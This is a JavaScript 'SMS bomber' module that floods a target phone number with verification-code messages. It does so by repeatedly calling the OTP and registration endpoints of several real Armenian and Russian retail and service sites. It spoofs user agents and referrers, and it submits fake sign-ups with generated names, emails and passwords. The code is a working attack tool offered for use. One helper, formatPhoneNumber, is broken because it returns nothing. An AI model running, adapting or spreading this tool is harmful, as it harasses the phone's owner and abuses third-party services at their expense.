import { faker } from '@faker-js/faker';
import gradient from 'gradient-string';
import { v4 as uuidv4 } from 'uuid';
import readline from 'readline';

const consoleColors = { blue: ['#199cff', '#0600ba'], green: ['#00ffee', '#00ff62'], nitral: ['#c4e6ff', '#b3b1b1'], red: ['#cf0808', '#630000'], rainbow: ['#ff1f1f', '#ff9e1f', '#ffff1f', '#5ffa16', '#16fa5f', '#16fadc', '#16b9fa', '#1666fa', '#1a16fa', '#8116fa', '#d016fa', '#fa16cc'] };
const userAgent = faker.internet.userAgent();

function formatPhoneNumber(phoneNumber) {
    phoneNumber.replace(/^(\+?374)(\d{2})(\d{6})$/, '$1-$2-$3');
}
async function sB (phoneNumber, count) {
    async function SAS() {
        try {
            const response = await fetch("https://www.sas.am/ajax/phone_check.php", {
                method: "POST",
                headers: {
                    'Content-Type': 'application/json',
                    "User-Agent": userAgent,
                    "Accept": "*/*"
                },
                referrer: "https://www.sas.am/personal/registration/",                                                                                                                                                                                                                                                                                                                                                                                                  
                body: JSON.stringify({
                    value: "+"+phoneNumber[0]
                })
            });
    
            return await response.json();
        } catch (error) {
            return null;
        }
    }
    
    async function ROBERTO() {
        try {
            const response = await fetch(`https://www.robertopiraloff.com/am/mobilelogin/index/ajaxsentotpforlogin/?mobile=${phoneNumber[0]}&_=1714066900648`, {
                method: "GET",
                headers: {
                    "User-Agent": userAgent,
                    "Accept": "*/*"
                },
                referrer: "https://www.robertopiraloff.com/"
            });
    
            return await response.json();
        } catch (error) {
            return null;
        }
    }
    async function KINOPARK() {
        try {
            const response = await fetch("https://kinoparkapi.mallapp.am/api/User/GetVerificationCode", {
                method: "POST",
                headers: {
                    'Content-Type': 'application/json',
                    "User-Agent": userAgent,
                    "Accept": "*/*"
                },
                referrer: "https://www.kinopark.am/",                                                                                                                                                                                                                                                                                                                                                                                                  
                body: JSON.stringify({
                    "PhoneNumber": phoneNumber[0]
                })
            });
    
            return await response.json();
        } catch (error) {
            return null;
        }
    }

    async function youla() {
        try {
            const response = await fetch("https://youla.ru/web-api/auth/request_code", {
                method: "POST",
                headers: {
                    'Content-Type': 'application/json',
                    "User-Agent": userAgent,
                    "Accept": "*/*"
                },                                                                                                                                                                                                                                                                                                                                                                                              
                body: JSON.stringify({
                    "phone": phoneNumber[0]
                })
            });
    
            return await response.json();
        } catch (error) {
            return null;
        }
    }
    async function naosstars() {

        let formattedNumber = formatPhoneNumber(phoneNumber[0]);
        let Num = "+" +formattedNumber;

        try {
            const response = await fetch(`https://naosstars.com/api/smsSend/${uuidv4()}`, {
                method: "POST",
                headers: {
                    'Content-Type': 'application/json',
                    "User-Agent": userAgent,
                    "Accept": "*/*"
                },
                referrer: "https://naosstars.com/user/register",                                                                                                                                                                                                                                                                                                                                                                                                  
                body: JSON.stringify({
                    "email": faker.internet.email(),
                    "first_name": faker.internet.username(),
                    "invitation_code": "",
                    "kvkk": "1",
                    "last_name": faker.internet.displayName(),
                    "new_password": faker.internet.password(),
                    "permission_newsletter": "1",
                    "telephone": Num,
                    "type": "register",
                    "user_check": "1"
                })
            });
    
            return await response.json();
        } catch (error) {
            return null;
        }
    }
    async function Tsum() {
        try {
            const response = await fetch(`https://api.tsum.ru/authorize/request-sms`, {
                method: "POST",
                headers: {
                    'Content-Type': 'application/json',
                    "User-Agent": userAgent,
                    "Accept": "*/*"
                },
                referrer: "https://www.tsum.ru/",                                                                                                                                                                                                                                                                                                                                                                                                  
                body: JSON.stringify({
                    "data": {
                        "type": "checkPhone",
                        "attributes": {
                            "phone": "+"+phoneNumber[0]
                        }
                    }
                })
            });
    
            return await response.json();
        } catch (error) {
            return null;
        }
    }
    for (let i = 0; i < count; i++) {
        setTimeout(async () => {
            const resSas = await SAS();
            if(!resSas) return console.log(gradient(consoleColors.red).multiline('[ERROR] ') + gradient(consoleColors.nitral).multiline(`Запрос не отправлен с SAS.AM`));
            if (resSas.success) console.log(gradient(consoleColors.green).multiline('[SUCCESS] ') + gradient(consoleColors.nitral).multiline(`Запрос успешно отправлен с SAS.AM`));
            else console.log(gradient(consoleColors.red).multiline('[ERROR] ') + gradient(consoleColors.nitral).multiline(`Запрос не отправлен с SAS.AM`));
        }, 500 * i);

        setTimeout(async () => {
            const resSas = await ROBERTO();
            if(!resSas) return console.log(gradient(consoleColors.red).multiline('[ERROR] ') + gradient(consoleColors.nitral).multiline(`Запрос не отправлен с ROBERTO.AM`));
            if (resSas.success) console.log(gradient(consoleColors.green).multiline('[SUCCESS] ') + gradient(consoleColors.nitral).multiline(`Запрос успешно отправлен с ROBERTO.AM`));
            else console.log(gradient(consoleColors.red).multiline('[ERROR] ') + gradient(consoleColors.nitral).multiline(`Запрос не отправлен с ROBERTO.AM`));
        }, 500 * i);

        setTimeout(async () => {
            const resSas = await KINOPARK();
            if(!resSas) return console.log(gradient(consoleColors.red).multiline('[ERROR] ') + gradient(consoleColors.nitral).multiline(`Запрос не отправлен с KINOPARK.AM`));
            if (!resSas.HasError) console.log(gradient(consoleColors.green).multiline('[SUCCESS] ') + gradient(consoleColors.nitral).multiline(`Запрос успешно отправлен с KINOPARK.AM`));
            else console.log(gradient(consoleColors.red).multiline('[ERROR] ') + gradient(consoleColors.nitral).multiline(`Запрос не отправлен с KINOPARK.AM`));
        }, 500 * i);

        setTimeout(async () => {
            const resSas = await naosstars();
            if(!resSas) return console.log(gradient(consoleColors.red).multiline('[ERROR] ') + gradient(consoleColors.nitral).multiline(`Запрос не отправлен с NAOSSTARS.COM`));
            if (resSas.message) console.log(gradient(consoleColors.red).multiline('[ERROR] ') + gradient(consoleColors.nitral).multiline(`Запрос не отправлен с NAOSSTARS.COM`));
            else console.log(gradient(consoleColors.green).multiline('[SUCCESS] ') + gradient(consoleColors.nitral).multiline(`Запрос успешно отправлен с NAOSSTARS.COM`));
        }, 500 * i);

        setTimeout(async () => {
            const resSas = await youla();
            if(!resSas) return console.log(gradient(consoleColors.red).multiline('[ERROR] ') + gradient(consoleColors.nitral).multiline(`Запрос не отправлен с YOULA.RU`));
            if (resSas.error) console.log(gradient(consoleColors.red).multiline('[ERROR] ') + gradient(consoleColors.nitral).multiline(`Запрос не отправлен с YOULA.RU`));
            else console.log(gradient(consoleColors.green).multiline('[SUCCESS] ') + gradient(consoleColors.nitral).multiline(`Запрос успешно отправлен с YOULA.RU`));
        }, 500 * i);

        setTimeout(async () => {
            const resSas = await Tsum();
            if (!resSas) console.log(gradient(consoleColors.red).multiline('[ERROR] ') + gradient(consoleColors.nitral).multiline(`Запрос не отправлен с TSUM.RU`));
            else console.log(gradient(consoleColors.green).multiline('[SUCCESS] ') + gradient(consoleColors.nitral).multiline(`Запрос успешно отправлен с TSUM.RU`));
        }, 61000 * i);
    }
}
export const smsBomber = (number, count) => {
    readline.cursorTo(process.stdout, 0, 0);
    readline.clearScreenDown(process.stdout);
    console.log(gradient(consoleColors.rainbow).multiline("\n     __  __ _    _      _      _   _   \n    |  \\/  (_)__| |_ _ (_)__ _| |_| |_\n    | |\\/| | / _` | ' \\| / _` | ' \\  _|\n    |_|  |_|_\\__,_|_||_|_\\__, |_||_\\__|\n                         |___/         \n     © EHD BY VARUJAN\n     VERSION 1.0.0 "));
    console.log(gradient(consoleColors.rainbow).multiline(`\nСмс бомбер был успешно запущен!\n`));
    sB([number], count);
}